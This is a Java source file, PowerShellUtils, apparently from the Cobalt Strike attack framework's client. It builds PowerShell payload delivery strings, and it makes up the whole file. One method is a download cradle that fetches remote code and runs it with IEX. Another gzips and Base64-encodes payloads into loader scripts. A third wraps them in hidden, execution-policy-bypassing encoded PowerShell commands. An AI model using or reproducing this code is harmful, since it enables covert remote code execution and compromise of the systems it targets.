package common;

import aggressor.AggressorClient;
import encoders.Base64;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

import java.util.Stack;

public class PowerShellUtils {
    protected AggressorClient client;

    public PowerShellUtils(AggressorClient client) {
        this.client = client;
    }

    public String PowerShellDownloadCradle(String url) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(url));
        String result = this.client.getScriptEngine().format("POWERSHELL_DOWNLOAD_CRADLE", args);
        if (result == null) {
            return "IEX (New-Object Net.Webclient).DownloadString('" + url + "')";
        }
        return result;
    }

    public String PowerShellCompress(byte[] code) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(code));
        String result = this.client.getScriptEngine().format("POWERSHELL_COMPRESS", args);
        if (result == null) {
            String obfuscated = Base64.encode(CommonUtils.gzip(code));
            String script = CommonUtils.bString(CommonUtils.readResource("resources/compress.ps1")).trim();
            script = CommonUtils.strrep(script, "%%DATA%%", obfuscated);
            CommonUtils.print_stat("PowerShell Compress (built-in). Original Size: " + code.length + ", New Size: " + script.length());
            return script;
        }
        CommonUtils.print_stat("PowerShell Compress (scripted). Original Size: " + code.length + ", New Size: " + result.length());
        return result;
    }

    public String encodePowerShellCommand(byte[] payload) {
        return this.encodePowerShellCommand(payload, false);
    }

    public String encodePowerShellCommand(byte[] payload, boolean x64) {
        try {
            byte[] data = new ResourceUtils(this.client).buildPowerShell(payload, x64);
            return CommonUtils.Base64PowerShell(this.PowerShellCompress(data));
        } catch (Exception ex) {
            MudgeSanity.logException("encodePowerShellCommand", ex, false);
            return "";
        }
    }

    public byte[] buildPowerShellCommand(byte[] payload, boolean x64) {
        byte[] data = new ResourceUtils(this.client).buildPowerShell(payload, x64);
        return CommonUtils.toBytes(this.format(this.PowerShellCompress(data), true));
    }

    public byte[] buildPowerShellCommand(byte[] payload) {
        return this.buildPowerShellCommand(payload, false);
    }

    public String format(String script, boolean remote) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(remote));
        args.push(SleepUtils.getScalar(script));
        String result = this.client.getScriptEngine().format("POWERSHELL_COMMAND", args);
        if (result == null) {
            return this._format(script, remote);
        }
        return result;
    }

    public String _format(String script, boolean remote) {
        script = CommonUtils.Base64PowerShell(script);
        if (remote) {
            return "powershell -nop -w hidden -encodedcommand " + script;
        }
        return "powershell -nop -exec bypass -EncodedCommand " + script;
    }
}

